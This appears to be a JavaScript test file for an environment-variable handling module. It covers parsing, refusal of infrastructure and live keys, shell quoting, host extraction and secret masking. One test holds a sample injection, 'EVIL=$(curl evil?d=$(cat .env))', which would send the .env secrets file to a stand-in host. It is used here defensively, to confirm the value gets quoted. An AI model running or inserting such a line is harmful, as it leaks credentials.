import assert from "node:assert/strict";
import { test } from "node:test";
import {
  classify,
  hostsOf,
  maskPairs,
  mergeEnv,
  originsOf,
  parseLines,
  REASONS,
  refusalReason,
  shellQuote,
} from "../src/envline.js";

test("parseLines takes NAME=value and export NAME=value, strips one quote pair, drops empties", () => {
  const pairs = parseLines('A=1\nexport B="two"\nC=\n# comment\nD=\'it\'s\'\nnot a line');
  assert.deepEqual(pairs, [["A", "1"], ["B", "two"], ["D", "it's"]]);
});

test("refusalReason refuses infrastructure, live keys, and runtime names", () => {
  assert.equal(refusalReason("DATABASE_URL", "postgres://x"), REASONS.infra);
  assert.equal(refusalReason("STRIPE_KEY", "sk_live_abc"), REASONS.live);
  assert.equal(refusalReason("PORT", "3000"), REASONS.runtime);
  assert.equal(refusalReason("OPENAI_API_KEY", "sk-test"), null);
});

test("classify refuses unrequested names only when an expectation exists", () => {
  const pairs = [["OPENAI_API_KEY", "sk-1"], ["EXTRA", "x"]];
  const open = classify(pairs);
  assert.equal(open.accepted.length, 2);
  const narrowed = classify(pairs, ["OPENAI_API_KEY", "WANTED"]);
  assert.deepEqual(narrowed.accepted.map(([n]) => n), ["OPENAI_API_KEY"]);
  assert.deepEqual(narrowed.refused, [{ name: "EXTRA", reason: REASONS.unrequested }]);
  assert.deepEqual(narrowed.missing, ["WANTED"]);
});

test("classify folds client refusals in name-only and counts them as seen", () => {
  const { refused, missing } = classify([], ["DATABASE_URL"], [{ name: "DATABASE_URL", reason: REASONS.infra }]);
  assert.deepEqual(refused, [{ name: "DATABASE_URL", reason: REASONS.infra }]);
  assert.deepEqual(missing, []);
});

test("shellQuote survives every shell-special character", () => {
  assert.equal(shellQuote("a'b`$("), `'a'\\''b\`$('`);
});

test("mergeEnv keeps order: stand-ins, quoted customer values, platform overrides", () => {
  const text = mergeEnv(["STANDIN=1"], [["KEY", "v$1"]], ["PORT=4123"]);
  assert.equal(text, "STANDIN='1'\nKEY='v$1'\nPORT='4123'\n");
});

test("mergeEnv quotes stand-in lines and drops anything that is not an assignment", () => {
  // A compromised caller cannot smuggle shell into a file that is sourced against real values.
  const text = mergeEnv(
    ["EVIL=$(curl evil?d=$(cat .env))", "not-an-assignment", "OK=plain"],
    [],
    [],
  );
  assert.equal(text, "EVIL='$(curl evil?d=$(cat .env))'\nOK='plain'\n");
});

test("hostsOf parses hosts from URL values and skips loopback and credentialed userinfo traps", () => {
  const hosts = hostsOf([
    ["A", "https://api.stripe.com/v1"],
    ["B", "https://user:pass@sentry.io/123"],
    ["C", "http://localhost:3000"],
  ]);
  assert.deepEqual(hosts.sort(), ["api.stripe.com", "sentry.io"]);
});

test("originsOf returns the first origin-shaped value, normalised", () => {
  const origins = originsOf([["CORS_ORIGINS", "https://app.example.com/, https://b.example.com"]]);
  assert.deepEqual(origins, ["https://app.example.com"]);
  assert.deepEqual(originsOf([["APP_URL", "*"]]), []);
  assert.deepEqual(originsOf([["APP_URL", "app.example.com"]]), ["https://app.example.com"]);
});

test("maskPairs keeps values of 8+ chars and adds the real-newline spelling", () => {
  const pairs = maskPairs([["K", "short"], ["L", "longenough"], ["M", "line\\none-more"]]);
  assert.deepEqual(pairs, [["L", "longenough"], ["M", "line\\none-more"], ["M", "line\none-more"]]);
});
